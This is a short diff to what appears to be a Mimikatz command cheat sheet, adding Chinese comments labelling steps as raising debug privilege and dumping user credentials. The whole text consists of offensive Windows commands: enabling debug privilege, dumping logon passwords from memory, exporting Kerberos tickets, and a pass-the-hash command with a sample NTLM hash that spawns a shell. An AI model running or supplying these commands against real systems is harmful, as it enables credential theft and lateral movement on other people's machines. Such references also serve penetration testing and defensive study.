@@ -1,5 +1,6 @@
 ```
 #general
+## 提升至DebugPrivilege权限
 privilege::debug
 log
 log customlogfilename.log
@@ -7,6 +8,7 @@ log customlogfilename.log
 
 #sekurlsa
 sekurlsa::logonpasswords
+## 导出用户凭据
 sekurlsa::logonPasswords full
 sekurlsa::tickets /export
 sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
